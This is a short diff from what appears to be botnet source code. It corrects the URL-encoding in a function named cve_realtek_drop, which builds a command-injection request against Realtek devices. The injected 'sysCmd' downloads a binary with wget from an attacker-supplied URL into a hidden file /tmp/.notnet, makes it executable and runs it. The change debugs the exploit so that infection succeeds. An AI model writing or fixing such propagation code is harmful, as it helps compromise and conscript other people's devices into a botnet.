@@ -2365,7 +2365,7 @@ static int cve_realtek_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
      * decodes to a space, giving mode 'x' instead of '+x'. */
     char body[1536];
     snprintf(body, sizeof(body),
-             "sysCmd=wget+%.500s+-O+/tmp/.notnet;chmod+%2Bx+/tmp/.notnet;/tmp/.notnet",
+             "sysCmd=wget+%.500s+-O+/tmp/.notnet;chmod+%%2Bx+/tmp/.notnet;/tmp/.notnet",
              dl_url);
     char req[2048];
     snprintf(req, sizeof(req),
